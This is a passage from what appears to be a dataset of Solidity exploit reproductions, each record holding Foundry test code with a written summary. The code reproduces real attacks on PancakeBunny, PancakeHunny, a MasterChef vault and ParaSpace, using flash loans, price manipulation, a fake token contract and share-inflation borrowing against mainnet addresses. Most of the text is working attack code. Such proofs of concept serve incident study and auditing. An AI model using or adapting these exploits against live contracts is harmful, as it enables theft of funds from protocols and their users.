IERC20(USDT).balanceOf(address(this)),\n                IERC20(USDT).decimals()\n            );\n        } else {\n            revert(\"Nothing earned.\");\n        }\n    }\n\n    function pancakeCall(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) public {\n        (uint256 level, uint256 asset) = abi.decode(data, (uint256, uint256));\n\n        // Take 6 WBNB flashloans from PCS\n        if (level + 1 < 7) {\n            level++;\n            (uint256 _amount0, uint256 _amount1, ) = pairs[level].getReserves();\n            if (WBNB == pairs[level].token1()) {\n                pairs[level].swap(\n                    0,\n                    _amount1 - 1,\n                    address(this),\n                    abi.encode(level, 1)\n                );\n            } else {\n                pairs[level].swap(\n                    _amount0 - 1,\n                    0,\n                    address(this),\n                    abi.encode(level, 0)\n                );\n            }\n        } else {\n            //flashloan from fortube bank\n            uint256 usdtFlashloanAmount = 2_961_750_450987026369366661; // 2'961'750.450987026369366661 USDT\n\n            FortubeBank.flashloan(\n                address(this),\n                USDT,\n                usdtFlashloanAmount,\n                hex\"\"\n            );\n            // execution passes to executeOperation()\n        }\n\n        //repay each PCS flashloan\n        uint256 retAmount = asset == 0\n            ? ((amount0 * 10_000) / 9_975 + 1)\n            : ((amount1 * 10_000) / 9_975 + 1);\n        require(\n            IERC20(WBNB).balanceOf(address(this)) >= retAmount,\n            \"not making proift\"\n        );\n        IERC20(WBNB).transfer(msg.sender, retAmount);\n    }\n\n    function executeOperation(\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata params\n    ) public {\n        uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));\n\n        emit log_named_decimal_uint(\n            \"After all PCS flashloans, attacker WBNB balance:\",\n            IERC20(WBNB).balanceOf(address(this)),\n            IERC20(WBNB).decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"After Fortube Bank flashloan, USDT balance of attacker:\",\n            usdtBalance,\n            IERC20(USDT).decimals()\n        );\n\n        // *Actual exploit*\n        exploit();\n\n        // Start repaying flashloans\n        emit log_string(\"Repaying flashloans...\");\n\n        // Repay fortube flashloan\n        uint256 usdtOwed = amount + fee;\n        IERC20(USDT).transfer(FortubeBank.controller(), usdtOwed);\n    }\n\n    function exploit() public {\n        uint256 wbnbAmount = IERC20(WBNB).balanceOf(address(this)) - 15_000e18;\n\n        // Manipulate BunnyMinter._zapAssetsToBunnyBNB - deposit liquidity\n        IERC20(WBNB).approve(address(zap), type(uint256).max);\n        zap.zapInToken(WBNB, 15_000e18, address(WBNBUSDTv2));\n        uint256 attackerLPBalance = IERC20(address(WBNBUSDTv2)).balanceOf(\n            address(this)\n        );\n        IERC20(address(WBNBUSDTv2)).transfer(\n            address(WBNBUSDTv2),\n            attackerLPBalance\n        );\n\n        emit log_string(\"Dumping all WBNB for USDT on WBNB+USDT v1 pool..\");\n\n        // Manipulate WBNB - USDT pair\n        (uint256 reserve0, uint256 reserve1, ) = WBNBUSDTv1.getReserves();\n        uint256 amountIn = wbnbAmount;\n        uint256 amountOut = router.getAmountOut(amountIn, reserve1, reserve0);\n        IERC20(WBNB).transfer(address(WBNBUSDTv1), amountIn);\n        WBNBUSDTv1.swap(amountOut, 0, address(this), hex\"\");\n\n        emit log_named_decimal_uint(\n            \"After dumping all WBNB, WBNB balance of attacker:\",\n            IERC20(WBNB).balanceOf(address(this)),\n            IERC20(WBNB).decimals()\n        );\n        emit log_named_decimal_uint(\n            \"After dumping all WBNB, USDT balance of attacker:\",\n            IERC20(USDT).balanceOf(address(this)),\n            IERC20(USDT).decimals()\n        );\n\n        //Collect inflated rewards\n        flip.getReward();\n\n        emit log_named_decimal_uint(\n            \"After collecting rewards, BUNNY balance of attacker:\",\n            IERC20(BUNNY).balanceOf(address(this)),\n            IERC20(BUNNY).decimals()\n        );\n\n        //Dump BUNNY\n        emit log_string(\"Dumping all BUNNY for WBNB on WBNB+BUNNY pool...\");\n        {\n            uint256 bunnyBalance = IERC20(BUNNY).balanceOf(address(this)) - 1;\n            (uint256 reserve0, uint256 reserve1, ) = WBNBBUNNY.getReserves();\n            uint256 amountIn = bunnyBalance;\n            uint256 amountOut = router.getAmountOut(\n                bunnyBalance,\n                reserve1,\n                reserve0\n            );\n\n            IERC20(BUNNY).transfer(address(WBNBBUNNY), amountIn);\n            WBNBBUNNY.swap(amountOut, 0, address(this), hex\"\");\n\n            emit log_named_decimal_uint(\n                \"After dumping all BUNNY, WBNB balance of attacker:\",\n                IERC20(WBNB).balanceOf(address(this)),\n                IERC20(WBNB).decimals()\n            );\n        }\n    }\n}\n",
        "summary": "This code is a test contract for an exploit on the PancakeBunny platform. The exploit involves the manipulation of price oracles and flash loans to profit at the expense of the platform. The contract initializes various addresses and contracts associated with the exploit, and includes functions to execute the exploit, trigger flash loans, and handle repayments. It also includes various logging and debugging functions for testing. It should be noted that this code should not be used for malicious purposes and is only intended for educational and informational purposes.",
        "id": "8f93e911-a81c-4730-af2b-e7e50845b460"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\n    Vulnerable contract: https://bscscan.com/address/0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300#code\n    Attack TX: https://bscscan.com/tx/0x765de8357994a206bb90af57dcf427f48a2021f2f28ca81f2c00bc3b9842be8e\n    Attacker contract: 0xb9b0090aaa81f374d66d94a8138d80caa2002950\n\n    Vulnerable code snippet:\n    function mintFor(address flip, uint _withdrawalFee, uint _performanceFee, address to, uint) override external onlyMinter {\n        uint feeSum = _performanceFee.add(_withdrawalFee);\n        IBEP20(flip).safeTransferFrom(msg.sender, address(this), feeSum);\n\n        uint hunnyBNBAmount = tokenToHunnyBNB(flip, IBEP20(flip).balanceOf(address(this)));  // incorrect use balanceOf.\n*/\n\ninterface CakeFlipVault {\n    function getReward() external;\n    function withdraw(uint256 amount) external;\n    function rewards(address) external view returns (uint256);\n}\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IPancakeRouter pancakeRouter =\n    IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n\n  address hunnyMinter = 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300;\n  CakeFlipVault cakeVault = CakeFlipVault(0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4);\n\n  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n  IERC20 cake = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);\n  IERC20 hunny = IERC20(0x565b72163f17849832A692A3c5928cc502f46D69);\n\n  constructor() {\n    cheat.createSelectFork(\n      \"bsc\",\n      7962338\n    ); //fork bsc at block 7962338\n\n    wbnb.approve(address(pancakeRouter), type(uint256).max);\n    hunny.approve(address(pancakeRouter), type(uint256).max);\n  }\n\n  function testExploit() public {\n    wbnb.deposit{ value: 5.752 ether }();\n    wbnb.transfer(address(this), 5.752 ether); \n\n    //WBNB was swapped to CAKE at PancakeSwap\n    address[] memory path = new address[](2);\n    path[0] = address(wbnb);\n    path[1] = address(cake);\n    pancakeRouter.swapExactETHForTokens{value: 5.752 ether}(0,path,address(this),1622687689);\n\n    emit log_named_decimal_uint(\"Swap cake, Cake Balance\", cake.balanceOf(address(this)),18);\n\n    //The attacker sent CAKE to our HUNNY Minter contract\n    cake.transfer(hunnyMinter,59880957483227401400);\n\n    //The attacker staked on CAKE-BNB Hive in PancakeHunny\n    cheat.startPrank(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6);\n    //HUNNY Minter was \u201ctricked\u201d to mint more HUNNY tokens\n    cakeVault.getReward();\n    hunny.transfer(address(this),hunny.balanceOf(address(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6)));\n    emit log_named_decimal_uint(\"Hunny Balance\", hunny.balanceOf(address(this)),18);\n    cheat.stopPrank();\n\n\n    //The attacker then sold the HUNNY tokens on PancakeSwap\n    address[] memory path2 = new address[](2);\n    path2[0] = address(hunny);\n    path2[1] = address(wbnb);\n    pancakeRouter.swapExactTokensForETH(hunny.balanceOf(address(this)),0,path2,address(this),1622687089);\n\n    emit log_named_decimal_uint(\"Swap WBNB, WBEB Balance\", wbnb.balanceOf(address(this)),18);\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract that tests an exploit on a vulnerable contract that was deployed on the Binance Smart Chain. The contract uses functions from various interfaces and interacts with different tokens such as WBNB, CAKE, and HUNNY. The exploit involves manipulating the balances of a contract's tokens to trick it into minting more tokens than it should. The attacker then transfers those tokens to themselves and sells them on PancakeSwap for WBNB. The smart contract tests this exploit by carrying out the steps of the attack and checking the balances of the tokens at each step using events.",
        "id": "479b975f-04d5-4372-a423-e9664df6f41d"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract EvilToken {\n  IMasterChef masterchef;\n  IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);\n  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n\n  constructor(IMasterChef _masterchef) {\n    masterchef = _masterchef;\n  }\n\n  function allowance(address owner, address spender)\n    external\n    view\n    returns (uint256)\n  {\n    return 2**256 - 1;\n  }\n\n  function balanceOf(address account) external view returns (uint256) {\n    return 1111;\n  }\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 amount\n  ) external returns (bool) {\n    if (\n      address(masterchef) != address(0) &&\n      address(msg.sender) != address(masterchef)\n    ) {\n      usdt.approve(address(masterchef), 2**256 - 1);\n      busd.approve(address(masterchef), 2**256 - 1);\n      masterchef.depositByAddLiquidity(\n        18,\n        [address(usdt), address(busd)],\n        [usdt.balanceOf(address(this)), busd.balanceOf(address(this))]\n      );\n    }\n    return true;\n  }\n\n  function redeem() external {\n    (uint256 _amount, ) = masterchef.userInfo(18, address(this));\n    masterchef.withdrawAndRemoveLiquidity(18, _amount, false);\n    usdt.transfer(msg.sender, usdt.balanceOf(address(this)));\n    busd.transfer(msg.sender, busd.balanceOf(address(this)));\n  }\n}\n\ncontract ContractTest is DSTest {\n  IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);\n  IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);\n  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n  IMasterChef masterchef =\n    IMasterChef(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);\n  EvilToken token0;\n  EvilToken token1;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"bsc\", 16008280); //fork bsc at block 16008280\n  }\n\n  function testExploit() public {\n    token0 = new EvilToken(IMasterChef(address(0)));\n    token1 = new EvilToken(masterchef);\n    pair.swap(10000 * 1e18, 10000 * 1e18, address(this), new bytes(1));\n    emit log_named_uint(\n      \"Before exploit, Dai balance of attacker:\",\n      usdt.balanceOf(msg.sender)\n    );\n    emit log_named_uint(\n      \"After exploit, Dai balance of attacker:\",\n      busd.balanceOf(msg.sender)\n    );\n\n    //iWithdraw.processExits(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    //  emit log_named_uint(\"After exploit, Dai balance of attacker:\",idai.balanceOf(msg.sender));\n  }\n\n  function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) public {\n    usdt.transfer(address(token1), usdt.balanceOf(address(this)));\n    busd.transfer(address(token1), busd.balanceOf(address(this)));\n    masterchef.depositByAddLiquidity(\n      18,\n      [address(token0), address(token1)],\n      [uint256(1), uint256(1)]\n    );\n    (uint256 _amount, ) = masterchef.userInfo(18, address(this));\n    masterchef.withdrawAndRemoveLiquidity(18, _amount, false);\n    address[] memory t = new address[](2);\n    t[0] = address(busd);\n    t[1] = address(usdt);\n    masterchef.withdrawChange(t);\n    token1.redeem();\n    usdt.transfer(msg.sender, ((amount0 / 9975) * 10000) + 10000);\n    busd.transfer(msg.sender, ((amount1 / 9975) * 10000) + 10000);\n    usdt.transfer(tx.origin, usdt.balanceOf(address(this)));\n    busd.transfer(tx.origin, busd.balanceOf(address(this)));\n  }\n}\n",
        "summary": "The code includes two smart contracts, `EvilToken` and `ContractTest`. `EvilToken` is a contract that interacts with a `MasterChef` smart contract and two ERC20 tokens (`USDT` and `BUSD`). It sets an infinite allowance for any spender, returns a fixed balance amount, and can transfer tokens from one address to another by depositing to the `MasterChef` and then withdrawing and removing liquidity. \n\n`ContractTest` is a contract that tests the functionality of the `pancakeCall` function in a PancakeSwap `IPancakePair` contract. It creates two instances of `EvilToken` and swaps tokens in the `IPancakePair` contract. It then uses the `MasterChef` smart contract to deposit tokens into the two instances of the `EvilToken` smart contract and then withdraws and removes liquidity. Finally, it transfers tokens from the `EvilToken` instances to the attacker's address. The purpose of the code is to illustrate a possible vulnerability and exploitation of the PancakeSwap protocol.",
        "id": "46a8795c-dfc4-48f1-a2e8-2b47ec4570ca"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1636650252844294144\n// @TX\n// https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a\n\ncontract ContractTest is DSTest {\n  address _pcAPE = 0xDDDe38696FBe5d11497D72d8801F651642d62353;\n  address _vDebtUSDC = 0x1B36ad30F6866716FF08EB599597D8CE7607571d;\n  address _vDebtwstETH = 0xCA76D6D905b08e3224945bFA0340E92CCbbE5171;\n  address _vDebtWETH = 0x87F92191e14d970f919268045A57f7bE84559CEA;\n  address _APE = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;\n  address _USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n  address _ParaProxy = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;\n  address _WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n  address _wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;\n  address _cAPE = 0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF;\n  address _Apecoin__Staking = 0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9;\n  address _Uniswap_V3__Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;\n  address _proxy = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;\n\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 16845558);\n    cheats.label(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, \"_wstETH\");\n    cheats.label(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, \"_WETH\");\n    cheats.label(0xDDDe38696FBe5d11497D72d8801F651642d62353, \"_pcAPE\");\n    cheats.label(0x4d224452801ACEd8B2F0aebE155379bb5D594381, \"_APE\");\n    cheats.label(0x1B36ad30F6866716FF08EB599597D8CE7607571d, \"_vDebtUSDC\");\n    cheats.label(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF, \"_cAPE\");\n    cheats.label(0xCA76D6D905b08e3224945bFA0340E92CCbbE5171, \"_vDebtwstETH\");\n    cheats.label(0x87F92191e14d970f919268045A57f7bE84559CEA, \"_vDebtWETH\");\n    cheats.label(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, \"_USDC\");\n    cheats.label(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee, \"_ParaProxy\");\n    cheats.label(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2, \"_proxy\");\n    cheats.label(\n      0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9,\n      \"_Apecoin__Staking\"\n    );\n    cheats.label(\n      0xE592427A0AEce92De3Edee1F18E0157C05861564,\n      \"_Uniswap_V3__Router\"\n    );\n  }\n\n  function testExploit() external {\n    emit log_named_uint(\n      \"Before exploit, _WETH balance of Attacker:\",\n      IERC20(_WETH).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"Before exploit, _pcAPE balance of Exploit:\",\n      IERC20(_pcAPE).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"Before exploit, _vDebtUSDC balance of Exploit:\",\n      IERC20(_vDebtUSDC).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"Before exploit, _vDebtWETH balance of Exploit:\",\n      IERC20(_vDebtWETH).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"Before exploit, _cAPE balance of Exploit:\",\n      IERC20(_cAPE).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"Before exploit, _vDebtwstETH balance of Exploit:\",\n      IERC20(_vDebtwstETH).balanceOf(address(this))\n    );\n\n    // () -> ()\n    _proxy.call(\n      abi.encodePacked(\n        bytes4(0x42b0b77c),\n        abi.encode(\n          address(this),\n          _wstETH,\n          uint256(47352823905004708422332),\n          new bytes(0),\n          uint16(0)\n        )\n      )\n    );\n\n    emit log_named_uint(\n      \"After exploit, _WETH balance of Attacker:\",\n      IERC20(_WETH).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"After exploit, _pcAPE balance of Exploit:\",\n      IERC20(_pcAPE).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"After exploit, _vDebtUSDC balance of Exploit:\",\n      IERC20(_vDebtUSDC).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"After exploit, _vDebtWETH balance of Exploit:\",\n      IERC20(_vDebtWETH).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"After exploit, _cAPE balance of Exploit:\",\n      IERC20(_cAPE).balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"After exploit, _vDebtwstETH balance of Exploit:\",\n      IERC20(_vDebtwstETH).balanceOf(address(this))\n    );\n  }\n\n  struct ExactInputSingleParams {\n    address tokenIn;\n    address tokenOut;\n    uint24 fee;\n    address recipient;\n    uint256 deadline;\n    uint256 amountIn;\n    uint256 amountOutMinimum;\n    uint160 sqrtPriceLimitX96;\n  }\n\n  struct ExactOutputSingleParams {\n    address tokenIn;\n    address tokenOut;\n    uint24 fee;\n    address recipient;\n    uint256 deadline;\n    uint256 amountOut;\n    uint256 amountInMaximum;\n    uint160 sqrtPriceLimitX96;\n  }\n\n  function executeOperation(\n    address asset,\n    uint256 amount,\n    uint256 premium,\n    address initiator,\n    bytes calldata params\n  ) public payable returns (bool) {\n    // approve(spender, amount) -> (bool _: true)\n    _cAPE.call(\n      abi.encodePacked(\n        bytes4(0x095ea7b3),\n        abi.encode(_ParaProxy, type(uint256).max)\n      )\n    );\n\n    for (uint256 i = 0; i < 8; i++) {\n      Slave _slave = new Slave();\n      if (i == 6) {\n        // transfer(recipient, amount) -> (bool _: true)\n        _wstETH.call(\n          abi.encodePacked(\n            bytes4(0xa9059cbb),\n            abi.encode(address(_slave), uint256(3676225912400376673786))\n          )\n        );\n        _slave.remove(1120000000000000000000000);\n      } else {\n        // transfer(recipient, amount) -> (bool _: true)\n        _wstETH.call(\n          abi.encodePacked(\n            bytes4(0xa9059cbb),\n            abi.encode(address(_slave), uint256(6039513998943475964078))\n          )\n        );\n        _slave.remove(1840000000000000000000000);\n      }\n\n      if (i != 7) {\n        // supply(asset, amount, onBehalfOf, referralCode) -> ()\n        _ParaProxy.call(\n          abi.encodePacked(\n            bytes4(0x617ba037),\n            abi.encode(\n              _cAPE,\n              IERC20(_cAPE).balanceOf(address(this)),\n              address(this),\n              uint256(0)\n            )\n          )\n        );\n      }\n    }\n\n    // approve(spender, amount) -> (bool _: true)\n    _wstETH.call(\n      abi.encodePacked(\n        bytes4(0x095ea7b3),\n        abi.encode(_Uniswap_V3__Router, type(uint256).max)\n      )\n    );\n\n    // exactInputSingle(ExactInputSingleParams calldata params) -> (uint256 amountOut) 1334451948153998962969\n    ExactInputSingleParams memory _var4 = ExactInputSingleParams({\n      tokenIn: _wstETH,\n      tokenOut: _WETH,\n      fee: 500,\n      recipient: address(this),\n      deadline: block.timestamp + 1000,\n      amountIn: 1400000000000000000000,\n      amountOutMinimum: 1300000000000000000000,\n      sqrtPriceLimitX96: 0\n    });\n    _Uniswap_V3__Router.call(\n      abi.encodePacked(bytes4(0x414bf389), abi.encode(_var4))\n    );\n\n    // approve(spender, amount) -> (bool _: true)\n    _WETH.call(\n      abi.encodePacked(\n        bytes4(0x095ea7b3),\n        abi.encode(_Uniswap_V3__Router, type(uint256).max)\n      )\n    );\n\n    // exactInputSingle(ExactInputSingleParams calldata params) -> (uint256 amountOut) 492214464588784613678468\n    ExactInputSingleParams memory _var6 = ExactInputSingleParams({\n      tokenIn: _WETH,\n      tokenOut: _APE,\n      fee: 3000,\n      recipient: address(this),\n      deadline: block.timestamp + 1000,\n      amountIn: IERC20(_WETH).balanceOf(address(this)),\n      amountOutMinimum: 480000000000000000000000,\n      sqrtPriceLimitX96: 0\n    });\n    _Uniswap_V3__Router.call(\n      abi.encodePacked(bytes4(0x414bf389), abi.encode(_var6))\n    );\n\n    // withdraw(amount) -> ()\n    _cAPE.call(\n      abi.encodePacked(\n        bytes4(0x2e1a7d4d),\n        abi.encode(IERC20(_cAPE).balanceOf(address(this)))\n      )\n    );\n\n    // approve(spender, amount) -> (bool _: true)\n    _APE.call(\n      abi.encodePacked(\n        bytes4(0x095ea7b3),\n        abi.encode(_Apecoin__Staking, type(uint256).max)\n      )\n    );\n\n    // depositApeCoin(amount,recipient) -> ()\n    _Apecoin__Staking.call(\n      abi.encodePacked(\n        bytes4(0xbd5023a9),\n        abi.encode(IERC20(_APE).balanceOf(address(this)), _cAPE)\n      )\n    );\n\n    // approve(spender, amount) -> (bool _: true)\n    _cAPE.call(\n      abi.encodePacked(\n        bytes4(0x095ea7b3),\n        abi.encode(_ParaProxy, type(uint256).max)\n      )\n    );\n\n    // borrow(asset, amount, referralCode, onBehalfOf) -> ()\n    _ParaProxy.call(\n      abi.encodePacked(\n        bytes4(0x1d5d7237),\n        abi.encode(\n          _wstETH,\n          uint256(44952823905004708422332),\n          uint256(0),\n          address(this)\n        )\n      )\n    );\n\n    // borrow(asset, amount, referralCode, onBehalfOf) -> ()\n    _ParaProxy.call(\n      abi.encodePacked(\n        bytes4(0x1d5d7237),\n        abi.encode(_USDC, uint256(7200000000000), uint256(0), address(this))\n      )\n    );\n\n    // borrow(asset, amount, referralCode, onBehalfOf) -> ()\n    _ParaProxy.call(\n      abi.encodePacked(\n        bytes4(0x1d5d7237),\n        abi.encode(\n          _WETH,\n          uint256(1200000000000000000000),\n          uint256(0),\n          address(this)\n        )\n      )\n    );\n\n    // approve(spender, amount) -> (bool _: true)\n    _USDC.call(\n      abi.encodePacked(\n        bytes4(0x095ea7b3),\n        abi.encode(_Uniswap_V3__Router, type(uint256).max)\n      )\n    );\n\n    // exactInputSingle(ExactInputSingleParams calldata params) -> (uint256 amountOut)\n    ExactInputSingleParams memory _var9 = ExactInputSingleParams({\n      tokenIn: _USDC,\n      tokenOut: _WETH,\n      fee: 500,\n      recipient: address(this),\n      deadline: block.timestamp + 1000,\n      amountIn: IERC20(_USDC).balanceOf(address(this)),\n      amountOutMinimum: 4042105262,\n      sqrtPriceLimitX96: 0\n    });\n    _Uniswap_V3__Router.call(\n      abi.encodePacked(bytes4(0x414bf389), abi.encode(_var9))\n    );\n\n    // approve(spender, amount) -> (bool _: true) --- TOTAL DEBT TO PAY THE LOAN\n    _wstETH.call(\n      abi.encodePacked(\n        bytes4(0x095ea7b3),\n        abi.encode(_proxy, uint256(47376500316957210776543))\n      )\n    );\n\n    // exactOutputSingle(ExactOutputSingleParams calldata params) -> (uint256 amountOut)\n    ExactOutputSingleParams memory _var11 = ExactOutputSingleParams({\n      tokenIn: _WETH,\n      tokenOut: _wstETH,\n      fee: 500,\n      recipient: address(this),\n      deadline: block.timestamp + 1000,\n      amountOut: 47376500316957210776543 -\n        IERC20(_wstETH).balanceOf(address(this)),\n      amountInMaximum: 2675071643612383606774,\n      sqrtPriceLimitX96: 0\n    });\n    _Uniswap_V3__Router.call(\n      abi.encodePacked(bytes4(0xdb3e2198), abi.encode(_var11))\n    );\n\n    // true\n    return true;\n  }\n\n  receive() external payable {}\n}\n\ncontract Slave {\n  address _wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;\n  address _cAPE = 0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF;\n  address _ParaProxy = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;\n\n  constructor() {\n    // approve(spender, amount) -> (bool _: true)\n    (, bytes memory returned0) = _wstETH.call(\n      abi.encodePacked(\n        bytes4(0x095ea7b3),\n        abi.encode(_ParaProxy, type(uint256).max)\n      )\n    );\n    bool _var0 = abi.decode(returned0, (bool));\n  }\n\n  function remove(uint256 _amountOfShares) public payable {\n    // supply(asset, amount, onBehalfOf, referralCode) -> ()\n    _ParaProxy.call(\n      abi.encodePacked(\n        bytes4(0x617ba037),\n        abi.encode(\n          _wstETH,\n          IERC20(_wstETH).balanceOf(address(this)),\n          address(this),\n          uint256(0)\n        )\n      )\n    );\n\n    // borrow(asset, amount, referralCode, onBehalfOf) -> ()\n    _ParaProxy.call(\n      abi.encodePacked(\n        bytes4(0x1d5d7237),\n        abi.encode(_cAPE, uint256(_amountOfShares), uint256(0), address(this))\n      )\n    );\n\n    // transfer(recipient, amount) -> (bool _: true)\n    _cAPE.call(\n      abi.encodePacked(\n        bytes4(0xa9059cbb),\n        abi.encode(msg.sender, IERC20(_cAPE).balanceOf(address(this)))\n      )\n    );\n  }\n}\n",
        "summary": "The code is a Solidity smart contract that defines a test function called `testExploit`. The function performs various actions such as transferring tokens between different addresses, approving spenders, calling other contracts and logging the state before and after each action. The overall purpose of the code appears to be testing and demonstrating an exploit related to flash loans and using the Uniswap v3 router to manipulate asset prices and borrow funds at a lower cost.",
        "id": "b1d63a85-f62f-47f8-b8ae-f714677c68b5"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1636650252844294144\n// @TX\n// https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a\n// @Update\n// https://docs.para.space/para-space/protocol-security-and-external-audits/withdrawal-and-borrow-timelock\n// https://twitter.com/ParaSpace_NFT/status/1639593663469875205\n// code: https://github.com/para-space/paraspace-core/pull/368/files\n\ninterface IParaProxy {\n    function supply(\n        address asset,\n        uint256 amount,\n        address onBehalfOf,\n        uint16 referralCode\n    ) external;\n\n    function borrow(\n        address asset,\n        uint256 amount,\n        uint16 referralCode,\n        address onBehalfOf\n    ) external;\n}\n\ninterface IAPEStaking {\n    function depositApeCoin(uint256 _amount, address _recipient) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);\n    IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);\n    IERC20 APE = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IParaProxy ParaProxy =\n        IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);\n    Uni_Router_V3 Router =\n        Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n    IAPEStaking APEStaking =\n        IAPEStaking(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9);\n    IAaveFlashloan AaveFlashloan =\n        IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);\n    Slave slave;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_845_558);\n        vm.label(address(wstETH), \"wstETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(cAPE), \"cAPE\");\n        vm.label(address(APE), \"APE\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(ParaProxy), \"ParaProxy\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(APEStaking), \"APEStaking\");\n        vm.label(address(AaveFlashloan), \"AaveFlashloan\");\n    }\n\n    function testExploit() external {\n        console.log(\"1 FlashLoan wstETH\");\n        AaveFlashloan.flashLoanSimple(\n            address(this),\n            address(wstETH),\n            47_352_823_905_004_708_422_332,\n            new bytes(0),\n            0\n        );\n\n        emit log_named_decimal_uint(\n            \"After exploit, WETH balance of Attacker:\",\n            WETH.balanceOf(address(this)),\n            WETH.decimals()\n        );\n    }\n\n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initator,\n        bytes calldata params\n    ) external returns (bool) {\n        wstETH.approve(address(AaveFlashloan), type(uint256).max);\n        cAPE.approve(address(ParaProxy), type(uint256).max);\n        uint256 _amountOfShare = 1_840_000_000_000_000_000_000_000;\n        uint256 transferAmount = 6_039_513_998_943_475_964_078;\n        